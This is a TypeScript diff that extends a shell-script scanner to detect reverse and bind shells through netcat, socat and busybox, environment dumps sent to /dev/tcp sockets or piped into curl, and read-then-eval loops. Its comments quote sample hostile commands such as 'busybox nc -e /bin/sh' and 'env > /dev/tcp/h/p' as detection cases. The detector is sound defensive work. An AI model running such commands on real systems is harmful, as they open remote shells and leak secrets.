@@ -162,56 +162,101 @@ function wordsOf(call: Node): (string | null)[] {
   return ((call?.Args || []) as Node[]).map((a) => resolveWordLiteral(a));
 }
 
+/** Multi-call binaries whose first operand is the applet that runs. */
+const MULTICALL = new Set(['busybox', 'toybox']);
+
 /** The head command name after the wrappers, and its index. */
 function headOf(words: (string | null)[]): { head: string; at: number } {
-  const at = unwrapCommandHead(words);
+  let at = unwrapCommandHead(words);
+  // `busybox nc -e /bin/sh h p`: the applet is the command.
+  if (MULTICALL.has(baseWord(words[at])) && at + 1 < words.length) at += 1;
   return { head: baseWord(words[at]), at };
 }
+
+/** Shell options whose next word is their value (`--rcfile FILE`, `-o OPT`). */
+const SHELL_VALUE_OPTIONS = new Set(['--rcfile', '--init-file', '-o', '+o', '-O', '+O']);
 
 /** A shell call with no script operand and no `-c`: it runs its stdin. */
 function shellReadsStdin(words: (string | null)[], at: number): boolean {
   const rest = words.slice(at + 1);
-  if (rest.some((w) => w === null)) return false;
-  return (rest as string[]).every((w) => w.startsWith('-') && !/^-[a-z]*c/i.test(w));
+  for (let i = 0; i < rest.length; i++) {
+    const w = rest[i];
+    if (w === null) return false;
+    if (SHELL_VALUE_OPTIONS.has(w)) {
+      i++; // its value
+      continue;
+    }
+    if (!/^[-+]/.test(w) || /^-[a-z]*c/i.test(w)) return false;
+  }
+  return true;
 }
 
-/** A program a reverse shell hands the connection to: a shell, by name or path. */
-function isShellProgram(word: string | null | undefined): boolean {
-  if (!word) return false;
-  const first = word
+/** The first word of a program operand, unquoted (`'bash -i'` -> `bash`). */
+function programWord(word: string | null | undefined): string | null {
+  if (!word) return null;
+  return word
     .trim()
     .split(/[\s,]/)[0]
     .replace(/^["']|["']$/g, '');
+}
+
+/** A program a bind or reverse shell hands the connection to: a shell. */
+function isShellProgram(word: string | null | undefined): boolean {
+  const first = programWord(word);
+  if (!first) return false;
   return SHELLS.has(baseWord(first)) || /(?:^|[\\/])cmd(?:\.exe)?$/i.test(first);
 }
 
+const INTERPRETERS = /^(?:python[0-9.]*|perl|ruby|node|nodejs|php|lua|tclsh|expect)$/;
+
+/** A program named as one: a shell, an interpreter, or a path (`/tmp/payload`,
+ *  `./x`). A bare name that is none of these is more likely a host name
+ *  (OpenBSD's `nc -e NAME` is the peer's certificate name). */
+function isProgramWord(word: string | null | undefined): boolean {
+  const first = programWord(word);
+  if (!first || first.startsWith('-')) return false;
+  return isShellProgram(first) || INTERPRETERS.test(baseWord(first)) || /[\\/]|\.exe$/i.test(first);
+}
+
 /**
- * netcat told to run a program: `--exec`/`--sh-exec`/`--lua-exec`, or `-e` /
- * `-c` (alone or ending a short bundle, `-nve`) followed by a shell. The
- * program must be a shell because OpenBSD's nc reads `-c` as "use TLS" and
- * `-e NAME` as the peer's certificate name: `nc -c -e api.example api 443`
- * connects, it runs nothing.
+ * netcat handing the connection to a program: `--exec` / `--sh-exec` /
+ * `--lua-exec`, or `-e` / `-c` (alone or ending a short bundle, `-nve`).
+ * A shell is a bind or reverse shell either way. Another program is one only
+ * when nc connects out: a listener running a handler (`ncat -l 8080 --exec
+ * ./handler`) is an inetd-style server. OpenBSD's nc reads `-c` as "use TLS"
+ * and `-e NAME` as a certificate name, which name no program.
  */
 function netcatRunsProgram(words: (string | null)[], at: number): boolean {
   const rest = words.slice(at + 1);
+  const listening = rest.some(
+    (w) => w === '--listen' || (w !== null && /^-[a-zA-Z]*l[a-zA-Z]*$/.test(w))
+  );
   return rest.some((w, i) => {
     if (w === null) return false;
-    if (NETCAT_EXEC_LONG.has(w.split('=')[0])) return true;
-    if (!/^-[a-zA-Z]*[ec]$/.test(w)) return false;
-    // `-c 'bash -i'`: the value is a command line, its first word the program.
-    return isShellProgram(rest[i + 1]);
+    const eq = w.indexOf('=');
+    const long = eq > 0 ? w.slice(0, eq) : w;
+    let program: string | null | undefined;
+    if (NETCAT_EXEC_LONG.has(long)) program = eq > 0 ? w.slice(eq + 1) : rest[i + 1];
+    else if (/^-[a-zA-Z]*[ec]$/.test(w)) program = rest[i + 1];
+    else return false;
+    // A Lua script is the program whatever its name.
+    if (long === '--lua-exec' && !listening) return true;
+    return isShellProgram(program) || (!listening && isProgramWord(program));
   });
 }
 
-/** socat joining a shell (`exec:bash`, `system:sh`) to a network address. A
- *  program that is not a shell (`TCP-LISTEN:8080,fork EXEC:./serve.sh`) is
- *  an inetd-style server, not a reverse shell. */
+/** socat joining a program address (`exec:`, `system:`) to a network one: a
+ *  shell always; another program only when socat connects out, since a
+ *  listener running one (`TCP-LISTEN:8080,fork EXEC:./serve.sh`) is a server. */
 function socatRunsProgram(words: (string | null)[], at: number): boolean {
   const addrs = words.slice(at + 1).filter((w): w is string => w !== null && !w.startsWith('-'));
-  const runsShell = addrs.some(
-    (a) => SOCAT_PROGRAM_RE.test(a) && isShellProgram(a.slice(a.search(/[:,]/) + 1))
-  );
-  return runsShell && addrs.some((a) => SOCAT_NET_RE.test(a));
+  const programs = addrs
+    .filter((a) => SOCAT_PROGRAM_RE.test(a))
+    .map((a) => a.slice(a.search(/[:,]/) + 1));
+  const nets = addrs.filter((a) => SOCAT_NET_RE.test(a));
+  if (programs.length === 0 || nets.length === 0) return false;
+  const listening = nets.some((a) => /^[a-z0-9-]*listen[:,]|^ssl-l[:,]/i.test(a));
+  return programs.some((p) => isShellProgram(p) || (!listening && isProgramWord(p)));
 }
 
 /** An env dump: what the call prints is the whole environment. */
@@ -236,6 +281,16 @@ function callDumpsEnv(words: (string | null)[], redirs: (string | null)[]): bool
   if ([...words.slice(1), ...redirs].some((w) => w !== null && PROC_ENVIRON_RE.test(w)))
     return true;
   return false;
+}
+
+/** An env dump behind wrappers too: `sudo printenv`, `nohup env`. */
+function dumpsEnv(words: (string | null)[], redirs: (string | null)[]): boolean {
+  const end = Math.min(headOf(words).at, words.length - 1);
+  for (let i = 1; i <= end; i++) {
+    const b = baseWord(words[i]);
+    if ((b === 'env' || b === 'printenv') && callDumpsEnv(words.slice(i), redirs)) return true;
+  }
+  return callDumpsEnv(words, redirs);
 }
 
 /** `export`, `declare -x`, `declare -p`, `typeset` with no names. */
@@ -354,6 +409,18 @@ class OutboundWalk {
         if (redirs.some((w) => w !== null && PROC_ENVIRON_RE.test(w))) {
           this.found('data.env-exfil', `${head} reads /proc/…/environ as its input`);
         }
+        // `curl -d @- … <<< "$(env)"`, or an expanding heredoc that holds it.
+        const stdin = ((stmt.Redirs || []) as Node[]).some(
+          (r) => (r?.Word && this.carriesEnv(r.Word)) || (r?.Hdoc && this.carriesEnv(r.Hdoc))
+        );
+        if (stdin) this.found('data.env-exfil', `${head} reads an env dump on its input`);
+      }
+      // `env > /dev/tcp/h/p`, `echo "$(env)" > /dev/tcp/h/p`: the socket is the sender.
+      if (
+        toSocket &&
+        (dumpsEnv(words, redirs) || ((cmd.Args || []) as Node[]).some((a) => this.carriesEnv(a)))
+      ) {
+        this.found('data.env-exfil', 'the environment is written to a network socket');
       }
       // A heredoc on a shell's stdin is the script it runs.
       if (depth < MAX_PAYLOAD_DEPTH && SHELLS.has(head) && shellReadsStdin(words, at)) {
@@ -366,6 +433,9 @@ class OutboundWalk {
       return;
     }
     if (type === 'DeclClause') {
+      if (toSocket && declDumpsEnv(cmd)) {
+        this.found('data.env-exfil', 'the environment is written to a network socket');
+      }
       // `export E="$(env)"`, `declare E=$(printenv)`.
       for (const a of (cmd.Args || []) as Node[]) {
         if (a?.Name?.Value && a.Value && this.carriesEnv(a.Value)) this.envVars.add(a.Name.Value);
@@ -420,7 +490,10 @@ class OutboundWalk {
     stages.forEach((st, i) => {
       const c = st?.Cmd;
       const redirs = redirectWords(st);
-      if (redirs.some((w) => w !== null && DEV_NET_RE.test(w)) || this.readsNetFd(st)) net = i;
+      const socket = redirs.some((w) => w !== null && DEV_NET_RE.test(w));
+      if (socket || this.readsNetFd(st)) net = i;
+      // A later stage writing to a socket sends what the pipeline carries.
+      if (socket && i > 0) sender = Math.max(sender, i);
       if (!c) return;
       if (syntax.NodeType(c) === 'DeclClause' && declDumpsEnv(c) && dump < 0) dump = i;
       // A loop that runs each line it reads (`while read l; do $l; done`).
@@ -435,8 +508,8 @@ class OutboundWalk {
       if (NET_CLIENTS.has(head)) net = i;
       if (head === 'openssl' && words[at + 1] === 's_client') net = i;
       const carries = ((c.Args || []) as Node[]).some((a) => this.carriesEnv(a));
-      if ((callDumpsEnv(words, redirs) || carries) && dump < 0) dump = i;
-      if (SENDERS.has(head) && i > 0) sender = i;
+      if ((dumpsEnv(words, redirs) || carries) && dump < 0) dump = i;
+      if (SENDERS.has(head) && i > 0) sender = Math.max(sender, i);
     });
     if (shell >= 0 && net >= 0) {
       this.reverseShell('a shell and a network client are joined in one pipeline');
@@ -487,7 +560,7 @@ class OutboundWalk {
         const t = syntax.NodeType(n);
         if (t === 'Stmt' && n.Cmd && syntax.NodeType(n.Cmd) === 'CallExpr') {
           const words = wordsOf(n.Cmd);
-          if (words.length > 0 && callDumpsEnv(words, redirectWords(n))) hit = true;
+          if (words.length > 0 && dumpsEnv(words, redirectWords(n))) hit = true;
         }
         if (t === 'DeclClause' && declDumpsEnv(n)) hit = true;
         return !hit;
@@ -504,9 +577,34 @@ class OutboundWalk {
   }
 }
 
-/** A statement that runs commands it is handed: a shell reading stdin, or a
- *  command whose name is a variable (`$line`), anywhere inside it. */
+/** The variable a word is, when it is only one (`$line`, `${line}`, `"$line"`). */
+function paramName(word: Node): string | null {
+  let parts: Node[] = word?.Parts || [];
+  if (parts.length === 1 && syntax.NodeType(parts[0]) === 'DblQuoted') parts = parts[0].Parts || [];
+  if (parts.length !== 1 || syntax.NodeType(parts[0]) !== 'ParamExp') return null;
+  return parts[0].Param?.Value ?? null;
+}
+
+/** A word that expands one of these variables anywhere inside it. */
+function refersTo(word: Node, names: Set<string>): boolean {
+  let hit = false;
+  syntax.Walk(word, (node: unknown) => {
+    if (hit || !node) return false;
+    const n = node as Node;
+    if (syntax.NodeType(n) === 'ParamExp' && names.has(n.Param?.Value)) hit = true;
+    return !hit;
+  });
+  return hit;
+}
+
+/**
+ * A statement that runs the commands it is handed: a shell reading stdin, or
+ * a line taken with `read` and then run (`while read l; do $l; done`,
+ * `eval "$l"`, `sh -c "$l"`). A variable naming a fixed program
+ * (`"$HANDLER" "$f"`) is handed data, not commands.
+ */
 function runsCommandsIn(stmt: Node): boolean {
+  const readVars = new Set<string>();
   let hit = false;
   syntax.Walk(stmt, (node: unknown) => {
     if (hit || !node) return false;
@@ -515,7 +613,21 @@ function runsCommandsIn(stmt: Node): boolean {
     const words = wordsOf(n);
     if (words.length === 0) return true;
     const { head, at } = headOf(words);
-    if (words[at] === null || (SHELLS.has(head) && shellReadsStdin(words, at))) hit = true;
+    const args: Node[] = n.Args || [];
+    if (head === 'read') {
+      for (const w of words.slice(at + 1)) if (w && /^[A-Za-z_]\w*$/.test(w)) readVars.add(w);
+      return true;
+    }
+    if (SHELLS.has(head) && shellReadsStdin(words, at)) hit = true;
+    else if (readVars.size > 0) {
+      const name = paramName(args[at]);
+      if (name !== null && readVars.has(name)) hit = true;
+      else if (
+        (head === 'eval' || SHELLS.has(head)) &&
+        args.slice(at + 1).some((a) => refersTo(a, readVars))
+      )
+        hit = true;
+    }
     return !hit;
   });
   return hit;
